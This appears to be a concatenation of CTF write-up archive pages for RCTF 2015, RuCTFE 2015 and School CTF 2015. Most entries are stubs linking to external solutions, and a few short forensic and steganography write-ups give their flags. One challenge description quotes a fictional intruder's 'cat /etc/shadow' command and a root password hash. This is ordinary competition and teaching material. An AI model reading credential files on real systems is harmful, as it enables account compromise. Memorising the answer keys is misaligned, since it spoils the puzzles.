> [OldDriver_4fb84bb07cc6bba14a484b434a24ac1b](./OldDriver_4fb84bb07cc6bba14a484b434a24ac1b)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: tank

**Category:** Reverse
**Points:** 200
**Solves:** 108
**Description:**

> go! go! play the game! the flag in the tenth level.(The flag should include RCTF{})
> 
> 
> [TankGame_49724e9f821d5e61d9029a37d778c1f0](./TankGame_49724e9f821d5e61d9029a37d778c1f0)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](https://www.iret.xyz/article.aspx/rctf2015_reverse)
* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://www.heysec.org/archives/85)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: VB

**Category:** Reverse
**Points:** 300
**Solves:** 19
**Description:**

> VB6 is the best programming language!
> 
> 
> hint:guess the algorithm
> 
> 
> [oldB_e1b50f669c68ed647eccb865f39df875](./oldB_e1b50f669c68ed647eccb865f39df875)


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
* [Chinese](http://www.purpleroc.com/md/RCTF-WriteUp.html)
* [Chinese](http://www.heysec.org/archives/85)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: survey

**Category:** Survey
**Points:** 20
**Solves:** 108
**Description:**

> <http://goo.gl/forms/BgnFXWKk4Y>


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://bobao.360.cn/ctf/learning/155.html)
# 2015 RCTF QUALS 2015: comprehensive

**Category:** Web
**Points:** 500
**Solves:** 0
**Description:**

> <http://180.76.178.50/>
> 
> 
> hint: There have sql file, you also need strong social ability.


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: easysql

**Category:** Web
**Points:** 150
**Solves:** 21
**Description:**

> <http://180.76.178.54:8002/2abb0f5175a93369a0cd07716bed554e/>


## Write-up

(TODO)

## Other write-ups and resources

* [Spanish](https://blog.ka0labs.net/post/26/)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: login

**Category:** Web
**Points:** 300
**Solves:** 8
**Description:**

> <http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/>
> 
> 
> Hint: nosql


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](https://github.com/garzon/CTF-Writeups/tree/master/RCTF2015#login-web-300)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: upload

**Category:** Web
**Points:** 100
**Solves:** 52
**Description:**

> <http://180.76.178.54:8001/17752375bfee20369364468686989278/>


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf)
# 2015 RCTF QUALS 2015: weeeeeb3

**Category:** Web
**Points:** 150
**Solves:** 62
**Description:**

> <http://180.76.178.54:8003/ebb12aea61a0209fbe0d97a903e99c10/index.php?module=login>


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](https://github.com/garzon/CTF-Writeups/tree/master/RCTF2015#weeeeeb3-web-150)
* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf
# 2015 RCTF QUALS 2015: xss?

**Category:** Web
**Points:** 300
**Solves:** 11
**Description:**

> Please use the latest version of chrome.
> 
> 
> <http://180.76.178.54:8004/4b79f5d4860384d4ac494ad91f5313b7/login.php>


## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://roisfzu.org/static/rctf2015-writeup.pdf
# CTF write-ups 2015

There are some problems with [CTF](https://ctftime.org/ctf-wtf/) write-ups in general:

* they’re scattered across the interwebs
* they don’t usually include the original files needed to solve the challenge
* some of them are incomplete or skip ‘obvious’ parts of the explanation, and are therefore not as helpful for newcomers
* often they disappear when the owner forgets to renew their domain or shuts down their blog

This repository aims to solve those problems.

It’s a collection of CTF source files and write-ups that anyone can contribute to. Did you just publish a CTF write-up? [Let us know](https://github.com/ctfs/write-ups-2015/issues/new), and we’ll add a link to your post — or just add the link yourself and submit a pull request. Spot an issue with a solution? Correct it, and send a pull request.

## Contributing

Please read [CONTRIBUTING.md](CONTRIBUTING.md).

## Archive

* [Write-ups for CTFs that occurred in 2013](https://github.com/ctfs/write-ups-2013)
* [Write-ups for CTFs that occurred in 2014](https://github.com/ctfs/write-ups-2014)
* [Write-ups for CTFs that occurred in 2015](https://github.com/ctfs/write-ups-2015) (this repository)
* [Write-ups for CTFs that occurred in 2016](https://github.com/ctfs/write-ups-2016)
# RuCTFE 2015: bank

**Category:** Bank
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015: electro

**Category:** Electro
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015: hm

**Category:** Hm
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015: mig

**Category:** Mig
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015: mol

**Category:** Mol
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015: nasarasa

**Category:** Nasarasa
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# RuCTFE 2015 write-ups

* <https://ructf.org/e/2015/index.html>
* [Scoreboard](https://ructf.org/e/2015/results.html) or [local alternative](./scoreboard)
* [Writeup Slides by the organizer](http://www.slideshare.net/MikhailVyatskov/ructfe-2015-services-writeups)

## Completed write-ups

* none yet

## External write-ups only

* none yet

## Missing write-ups

* [bank](bank)
* [electro](electro)
* [hm](hm)
* [mig](mig)
* [mol](mol)
* [nasarasa](nasarasa)
* [tax](tax)# RuCTFE 2015: tax

**Category:** Tax
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# School CTF 2015: affine-cipher-100

**Category:** Crypto
**Points:** 100

**Description:**

> Decrypt the message, which was encrypted with following rules:
>
>     for each letter of cipher text its position in the alphabet is the position of the original letter multiplied by 4 and shifted by 15 character
>
>     shift over alphabet is cyclic, so 'z' shifted by 1 is '_' and '_' shifted by 1 is 'a'
>
>     aplhabet consists of letters from 'a' to 'z' and symbol '_'
>
>     letter 'a' has position 0, symbol '_' has position 26 ( following 'z' )
>
> Encrypted message: ifpmluglesecdlqp_rclfrseljpkq
## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Japanese](http://chikyukotei.github.io/2015/09/12/schoolctf-2015-affine-cipher-100-writeup/)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* <https://github.com/BurningMarshmallow/CTF/blob/master/affine_solve.py>
* <https://ideone.com/EqJa4L>
# School CTF 2015: bypassing-the-snake-400

**Category:** Crypto
**Points:** 400

**Description:**

> Who is the author of the phrase?
>
> Flag format: firstname_lastname, e.g. john_snow

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: crypto-lego-500

**Category:** Crypto
**Points:** 500

**Description:**

> Creator of this task did not have Lego in his childhood. In desperation he has transformed letters of the input text in THIS. Try to recover the plain text.
>
> Flag format: english words in lower case separated with underscores, e.g. this_is_flag

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: super-digest-4-400

**Category:** Crypto
**Points:** 400

**Description:**

> We desingned new super reliable hash function - Super Digest 4! It generates number (the same as a hash) for every string. We are sure that it is impossible to recover original string from the hash or get a collision. You can get its sources here
>
> We have a service opened for everyone, who wants to break our invention: nc sibears.ru 11311
## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: super-digest-4-strong-500

**Category:** Crypto
**Points:** 500
**Description:**

> We suspect that our first version of Super Digest 4 isn't perfect. So we have modified it -- new sources here. Now it is very collision resistant. Large corporation, such as "Elgoog" use it to store password hashes.
>
> 8 main administrators work in "Elgoog". They don't like memorize many password. So, they have remembered one password for the foremost administrator and other 7 password is obtained from it by the left shift on 1 symbol.
>
> For example from password "1234567" can be obtained 7 other passwords:
>
> "23456781" "34567812" ... "81234567"
>
> We are rely on Super Digest 4 collision resistance and expierence of our lawyers and give anyone hashes of all passwords. Connect to our service and post password of the foremost administrator to get the flag: nc sibears.ru 11511

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: hidden-file-200

**Category:** Forensics
**Points:** 200

**Description:**

>See the [picture](./eng_d57d2fcf49801b8156b08a4cebb3fdc44c11466f.png)

## Write-up

by [polym](https://github.com/abpolym)

We are given a zip archive that we extract using `7z` to find 6 images and one thumbnail database, `Thumbs.db`:

```bash
+bash-4.3$ 7z x archive_aa0ff96d678e0d96f808e7ac50c07fa65c9aceed.zip -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: archive_aa0ff96d678e0d96f808e7ac50c07fa65c9aceed.zip

Extracting  Thumbs.db
Extracting  1.png
Extracting  2.jpg
Extracting  3.jpg
Extracting  4.jpg
Extracting  5.jpg
Extracting  6.jpg

Everything is Ok

Files: 7
Size:       190660
Compressed: 50880
+bash-4.3$ cd out
+bash-4.3$ file *
1.png:     PNG image data, 100 x 100, 8-bit/color RGB, non-interlaced
2.jpg:     JPEG image data, JFIF standard 1.02
3.jpg:     JPEG image data, JFIF standard 1.02
4.jpg:     JPEG image data, JFIF standard 1.02
5.jpg:     JPEG image data, JFIF standard 1.02
6.jpg:     JPEG image data, JFIF standard 1.02
Thumbs.db: CDF V2 Document, No summary info
```

The first 6 images just spell out `FLAGIS`:

![](./step1.png)

We can extract `Thumbs.db` like any zip-archive and find more data blobs:

```bash
+bash-4.3$ 7z x Thumbs.db -oout

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=utf8,Utf16=on,HugeFiles=on,8 CPUs)

Processing archive: Thumbs.db

Extracting  8
Extracting  4
Extracting  2
Extracting  1
Extracting  3
Extracting  6
Extracting  5
Extracting  7
Extracting  21
Extracting  01
Extracting  9
Extracting  11
Extracting  02
Extracting  03
Extracting  12
Extracting  13
Extracting  61
Extracting  41
Extracting  31
Extracting  22
Extracting  23
Extracting  32
Extracting  33
Extracting  51
Extracting  42
Extracting  52
Extracting  81
Extracting  71
Extracting  62
Extracting  72
Extracting  91
Extracting  82
Extracting  92
Extracting  Catalog

Everything is Ok

Files: 34
Size:       50912
Compressed: 61440
+bash-4.3$ cd out/
```

By opening one of these files with a hexeditor, we see that they are JPGs (same file signature `JFIF` as normal JPGs) with extra 12 bytes of meta-data:

![](./blob-hexedit.png)

After removing `Catalog`, which is a catalogue/meta-data file about all other files inside `Thumbs.db`, we snip the extra bytes using `xxd` and save the JPGs in another directory:

```bash
+bash-4.3$ rm Catalog
+bash-4.3$ mkdir jpgs
+bash-4.3$ for i in *; do xxd -s12 -p "$i" | xxd -r -p > "jpgs/$i.jpg"; done
+bash-4.3$ cd jpgs/
+bash-4.3$ file *
01.jpg:   JPEG image data, JFIF standard 1.01
02.jpg:   JPEG image data, JFIF standard 1.01
03.jpg:   JPEG image data, JFIF standard 1.01
1.jpg:    JPEG image data, JFIF standard 1.01
11.jpg:   JPEG image data, JFIF standard 1.01
12.jpg:   JPEG image data, JFIF standard 1.01
13.jpg:   JPEG image data, JFIF standard 1.01
2.jpg:    JPEG image data, JFIF standard 1.01
21.jpg:   JPEG image data, JFIF standard 1.01
22.jpg:   JPEG image data, JFIF standard 1.01
23.jpg:   JPEG image data, JFIF standard 1.01
3.jpg:    JPEG image data, JFIF standard 1.01
31.jpg:   JPEG image data, JFIF standard 1.01
32.jpg:   JPEG image data, JFIF standard 1.01
33.jpg:   JPEG image data, JFIF standard 1.01
4.jpg:    JPEG image data, JFIF standard 1.01
41.jpg:   JPEG image data, JFIF standard 1.01
42.jpg:   JPEG image data, JFIF standard 1.01
5.jpg:    JPEG image data, JFIF standard 1.01
51.jpg:   JPEG image data, JFIF standard 1.01
52.jpg:   JPEG image data, JFIF standard 1.01
6.jpg:    JPEG image data, JFIF standard 1.01
61.jpg:   JPEG image data, JFIF standard 1.01
62.jpg:   JPEG image data, JFIF standard 1.01
7.jpg:    JPEG image data, JFIF standard 1.01
71.jpg:   JPEG image data, JFIF standard 1.01
72.jpg:   JPEG image data, JFIF standard 1.01
8.jpg:    JPEG image data, JFIF standard 1.01
81.jpg:   JPEG image data, JFIF standard 1.01
82.jpg:   JPEG image data, JFIF standard 1.01
9.jpg:    JPEG image data, JFIF standard 1.01
91.jpg:   JPEG image data, JFIF standard 1.01
92.jpg:   JPEG image data, JFIF standard 1.01
```

We have a look at the JPGs to see that they, rearranged, spell out our flag, `XP_WAS_SO_SWEET_FOR_HACKERS`:

![](./flag.png)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-hidden-file-200pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: agrement-by-default-100

**Category:** Joy
**Points:** 100
**Description:**

> "Where does a wise man hide a leaf? In the forest." link

## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* [Japanese](http://fl04t.hatenablog.com/entry/2015/05/04/School_CTF_Writeup)
# School CTF 2015: alpha-to-foxtrot-alpha-150

**Category:** Joy
**Points:** 150
**Description:**

> During the "#1337 accident" our specialist managed to intercept the radio exchange between aircrafts of our potential adversaries. Part of the message is still unclear to our cryptographers. Your Duty is to help us!
>
> Flag format: phrase_in_english

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: darkness-200

**Category:**
**Points:**
**Solves:**
**Description:**

> Hey everyone, that's again the guy with a fake Google Glass (-_-) Last year we didn't managed to get the password from the video, so I'm looking forward to revenge! Today I definitely can enter their intranet! I catch the moment when their boss login to the company's site using gesture password, but it's again too difficult for me >__<
>
> Here is a video (yea, yea again in that SUPERDUPERHD quality) And their intranet site URL, hopefully it's accessible through Internet: http://sibears.ru:11711
>
> Please help me to revenge on them!

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: not-weird-selfie-200

**Category:** Joy
**Points:** 200

**Description:**

> Tweet a picture of your team with a bear and use #schoolctf. We'll send you back the flag via personal messages.

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-not-weird-selfie-200pts/) 
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: old-school-hacking-200

**Category:** 
**Points:** 
**Solves:** 
**Description:**

> When you can't complete the game, it's time to use cheats.
## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: weird-selfie-100

**Category:** Joy
**Points:** 100

**Description:**

> Somebody has hacked my email and now uses it to send weird selfies! Please help me to figure out the hacker's name!
>
> Flag format: firstname_lastname,e.g. john_snow

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-weird-selfie-100pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* [Japanese](http://fl04t.hatenablog.com/entry/2015/05/04/School_CTF_Writeup)
# School CTF 2015: misconfiguration-300

**Category:** Networks
**Points:** 300

**Description:**

> They say there is a flag here but we can't get in. Google for the solution.
>
> If you find that some site is blocked by your internet provider you may use our proxy sibears.ru:22022

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: tricky-authorization-200

**Category:** Networks
**Points:** 200
**Description:**

> There is some tricky authorization, will you take a look?
>
> nc sibears.ru 11811

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-tricky-authorization-200pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: ssh-jail-500

**Category:** Pwn
**Points:** 500

**Description:**

> Do u know what to do? $ ssh -p 11111 guest@sibears.ru password: guest

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF write-ups

* <http://school-ctf.org/>
* [Scoreboard](http://school-ctf.org/#rating-ref) or local alternative for [school only teams](./scoreboard-schoolteams) or [non-school teams](./scoreboard-noschoolteams)

## Completed write-ups

* [forensics/hidden-file-200](forensics/hidden-file-200)
* [stegano/run-the-image-400](stegano/run-the-image-400)
* [stegano/strange-spam-100](stegano/strange-spam-100)
* [stegano/tacticus-abilitus-100](stegano/tacticus-abilitus-100)

## External write-ups only

* [crypto/affine-cipher-100](crypto/affine-cipher-100)
* [crypto/bypassing-the-snake-400](crypto/bypassing-the-snake-400)
* [crypto/crypto-lego-500](crypto/crypto-lego-500)
* [crypto/super-digest-4-400](crypto/super-digest-4-400)
* [crypto/super-digest-4-strong-500](crypto/super-digest-4-strong-500)
* [joy/agrement-by-default-100](joy/agrement-by-default-100)
* [joy/alpha-to-foxtrot-alpha-150](joy/alpha-to-foxtrot-alpha-150)
* [joy/darkness-200](joy/darkness-200)
* [joy/not-weird-selfie-200](joy/not-weird-selfie-200)
* [joy/old-school-hacking-200](joy/old-school-hacking-200)
* [joy/weird-selfie-100](joy/weird-selfie-100)
* [networks/misconfiguration-300](networks/misconfiguration-300)
* [networks/tricky-authorization-200](networks/tricky-authorization-200)
* [pwn/ssh-jail-500](pwn/ssh-jail-500)
* [reverse/school-incident-150](reverse/school-incident-150)
* [reverse/strange-program-300](reverse/strange-program-300)
* [stegano/the-great-thing-200](stegano/the-great-thing-200)
* [web/junior-pentesting-300](web/junior-pentesting-300)
* [web/shop-of-goodness-100](web/shop-of-goodness-100)
* [web/stored-pass-100](web/stored-pass-100)
* [web/unusual-redirection-300](web/unusual-redirection-300)

## Missing write-ups# School CTF 2015: school-incident-150

**Category:** Reverse
**Points:** 150

**Description:**

> Somebody called Johnny Droptables managed to infiltrate to the school schedule server. He commented this event on a forum:
>
>     LOL, look at these stupid admins, bros! They set easy-breasy root password and store md5 of the password in /etc/shadow:
>
>         root@school:#cat /etc/shadow root:f505f1e49e98cea82c9c4265262444f6:14425:0:99999:7::: teacher:*:14425:0:99999:7:::
>         adm:*:14425:0:99999:7:::
>         ...
>
>     No more lessons 2day, rofl xD
>
> Flag - root password

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-school-incident-150pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: strange-program-300

**Category:** Reverse
**Points:** 300

**Description:**

> We have found the strange file named mascal.pas in one of directories on our server. Probably it is a source code of some program, but we can't understand its algorithm. Can you tell us its output?

## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
# School CTF 2015: run-the-image-400

**Category:** Steagano
**Points:** 400

**Description:**

> This Image Cannot Be Run in DOS Mode, but what about its part?

## Write-up

by [polym](https://github.com/abpolym)

We are given a picture:

![](stegano2_d5e256930e8becd029ed32477365cd0270ca698a.jpeg)

The description hints that the picture cannot be run in DOS mode, but a part of it.
This hints that there is an PE executable inside the jpeg, which we can detect with `binwalk` and extract with `foremost`:

```bash
+bash-4.3$ binwalk stegano2_d5e256930e8becd029ed32477365cd0270ca698a.jpeg | grep -v Zlib
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard  1.01
37079         0x90D7          Microsoft portable executable

+bash-4.3$ foremost stegano2_d5e256930e8becd029ed32477365cd0270ca698a.jpeg 
Processing: stegano2_d5e256930e8becd029ed32477365cd0270ca698a.jpeg
|*|
+bash-4.3$ tree output/
output/
├── audit.txt
├── exe
│   └── 00000072.exe
└── jpg
    └── 00000000.jpg

    2 directories, 3 files
```

Running the resulting [executable](00000072.exe) in any sandbox of our choice (e.g. [malwr](https://malwr.com/) or [anubis](https://anubis.iseclab.org/) gives us the flag,`aw3s0me_flag`:

![](./malwr.png)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: strange-spam-100

**Category:** Steagano
**Points:** 100

**Description:**

> There is a meaning even in things originally intended to be meaningless, it is only necessary to find it.

## Write-up

by [polym](https://github.com/abpolym)

This writeup is based on this [Indonesian writeup](http://www.hasnydes.us/2015/05/schoolctf-strange-spam-100pts/).

Searching for the keywords `spam steganography`, we find a [website that offers steganography using spam mails](http://www.spammimic.com/).

We copy verbatim our spam message into the [decode site](http://www.spammimic.com/decode.shtml) and receive the flag:

![](./spam-flag.png)

The flag is `flag_is_b3st_spam_st3g4n0`.

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-strange-spam-100pts/) 
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* [Japanese](http://fl04t.hatenablog.com/entry/2015/05/04/School_CTF_Writeup)
# School CTF 2015: tacticus-abilitus-100

**Category:** Steagano
**Points:** 100

**Description:**

> Somebody should fix his printer, shouldn't he? link

## Write-up

by [polym](https://github.com/abpolym)

This writeup is very loosely based on [this Indonesian writeup](http://www.hasnydes.us/2015/05/schoolctf-tacticus-abilitus-100pts/)
We are given a PNG:

![](./task_b7fa3c580c809ad617e159dd07ec60743ba573a8.png)

After reading the challenge description and having a closer look at the text, we notice some tainted characters:

![](./taint.png)

We write down every tainted character:

	flagisaeneascpiher

The flag is `aeneascpiher`.

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-tacticus-abilitus-100pts/) 
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* [Japanese](http://fl04t.hatenablog.com/entry/2015/05/04/School_CTF_Writeup)
# School CTF 2015: the-great-thing-200

**Category:** Steagano
**Points:** 200

**Description:**

> document

## Write-up

(TODO)

## Other write-ups and resources

* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
* [Japanese](http://fl04t.hatenablog.com/entry/2015/05/04/School_CTF_Writeup)
# School CTF 2015: junior-pentesting-300

**Category:** Web
**Points:** 300

**Description:**

> Junior pentester Johnny Droptables continues his victorious raid on school servers and web sites. That is one of the last his messages posted on a forum:
>
>     LMFAO, just logged http://sibears.ru:11211/ as admin without a password))) So classical no pass SQL injection))))

## Write-up

(TODO)

## Other write-ups and resources

* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: shop-of-goodness-100

**Category:** Web
**Points:** 100

**Description:**

> Let's buy that awesome flag! http://sibears.ru:11011/

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-shop-of-goodness-100pts/) 
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: stored-pass-100

**Category:** Web
**Points:** 100

**Description:**

> Hmm, that password seems to be stored in the browser, but I sure that I have never visited that site http://sibears.ru:11411/

## Write-up

(TODO)

## Other write-ups and resources

* [Indonesian](http://www.hasnydes.us/2015/05/schoolctf-stored-pass-100pts/)
* [Japanese](http://charo-it.hatenablog.jp/entry/2015/05/03/225115)
* [Chinese](http://blog.lionbug.pw/ctf/school-ctf-spring-writeup/) (Down, [Cached version](http://webcache.googleusercontent.com/search?q=cache:9Ss-ircs-WgJ:blog.lionbug.pw/ctf/school-ctf-spring-writeup/+&cd=4&hl=de&ct=clnk&gl=de))
# School CTF 2015: unusual-redirection-300

**Category:** Web
**Points:** 300

**Description:**

> Somebody has moved the flag so it is not available to everyone, but old link still is usefull http://sibears.ru:11611/

## Write-up

(TODO)

## Other write-ups and resources

